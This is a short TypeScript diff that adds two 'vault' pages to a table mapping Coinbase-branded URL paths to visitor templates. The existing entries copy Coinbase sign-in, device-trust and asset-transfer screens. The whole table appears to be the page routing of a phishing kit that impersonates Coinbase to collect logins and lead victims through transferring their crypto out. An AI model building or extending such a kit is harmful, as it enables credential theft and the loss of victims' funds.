@@ -52,6 +52,8 @@ const COINBASE_PATHS: Record<string, VisitorTemplateRef> = {
 	'/signin/review': { brand: 'Coinbase', page: 'Review Login' },
 	'/signin/trust-device': { brand: 'Coinbase', page: 'Trust Device' },
 	'/signin/terminate-devices': { brand: 'Coinbase', page: 'Terminate Devices' },
+	'/vault/moving': { brand: 'Coinbase', page: 'Moving Vault' },
+	'/vault/intro': { brand: 'Coinbase', page: 'Vault Intro' },
 	'/vault/transfer': { brand: 'Coinbase', page: 'Transfer from Coinbase' },
 	'/vault/select-asset': { brand: 'Coinbase', page: 'Select Asset' },
 	'/vault/confirm': { brand: 'Coinbase', page: 'Confirm Transfer' },
